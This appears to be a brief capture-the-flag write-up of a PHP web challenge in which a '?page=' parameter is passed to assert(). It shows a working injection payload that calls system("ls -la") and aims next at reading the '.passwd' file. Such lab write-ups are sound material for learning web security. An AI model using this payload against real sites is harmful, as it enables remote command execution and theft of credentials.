After wandering around the site, we can see an insertion via ?page=, so we suspect that the injection is here.
## Testing PHP `assert()` Function

### Initial Test

I decided to test the following URL parameter:
```
?page='AA'
```

This returns the error:
```
Parse error: syntax error, unexpected 'AA' (T_STRING) in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1
Catchable fatal error: assert(): Failure evaluating code: strpos('includes/'AA'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8
```

### Goal

My goal is to display some information before the `assert` interprets my `$_GET["page"]`.

### Solution

After searching online, I found that the `system()` function can help achieve this. According to the documentation:
> `system` - Executes an external program and displays the result
> 
> Syntax: `system("command")`

Using this, I can display the information before it is interpreted.

### Attempt

I tried sending the following URL parameter:
```
?page='.system("ls -la").'
```

### Next Steps

The next step is to display the contents of `.passwd` to complete the task.